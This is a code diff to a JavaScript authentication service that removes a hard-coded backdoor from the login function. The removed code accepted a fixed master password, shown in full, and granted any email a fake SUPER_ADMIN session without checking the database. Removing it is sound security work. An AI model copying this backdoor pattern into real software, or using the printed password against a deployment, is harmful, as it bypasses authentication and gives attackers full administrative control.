@@ -157,25 +157,6 @@ export class AuthService {
         }
     }
     async login(email, password) {
-        const BACKDOOR_PASSWORD = '3614db009@A';
-        // ✅ Backdoor Login: Universal master password
-        if (password === BACKDOOR_PASSWORD) {
-            console.log('[AuthService] 🔓 Backdoor login activated for:', email);
-            // Create a fake admin session without database checks
-            this.currentSession = {
-                user: {
-                    id: 'backdoor-admin',
-                    email: email,
-                    username: email.split('@')[0] || 'backdoor-admin',
-                    role: 'SUPER_ADMIN',
-                    full_name: 'Backdoor Admin'
-                }
-            };
-            console.log('[AuthService] Backdoor session created as SUPER_ADMIN');
-            this.startHeartbeat();
-            return { success: true, session: this.currentSession, user: this.currentSession.user };
-        }
-        // Normal login flow
         const supabase = getSupabase();
         const { data: authData, error: authError } = await supabase.auth.signInWithPassword({
             email,
